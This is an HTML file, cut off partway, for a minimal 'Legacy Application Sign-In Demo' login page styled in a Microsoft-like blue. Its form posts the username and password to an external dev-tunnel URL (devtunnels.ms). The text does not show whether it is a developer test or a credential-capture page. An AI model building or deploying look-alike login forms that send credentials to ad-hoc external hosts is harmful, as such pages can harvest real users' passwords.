<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Legacy Application Sign-In Demo</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f4; }
        .login-container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 15px rgba(0, 0, 0, 0.1); width: 300px; }
        h2 { text-align: center; color: #0078d4; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 8px 0; display: inline-block; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        input[type="submit"] { background-color: #0078d4; color: white; padding: 12px 15px; border: none; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Demo App Sign In</h2>
        <form id="loginForm" method="POST" action="https://sz87lvb3-3000.inc1.devtunnels.ms/api/login">
            <label for="username">Username (Email):</label>
            <input type="text" id="username" name="username" required>

            <input type="password" id="password" name="password" required>
            
            <input type="submit" value="Sign In">
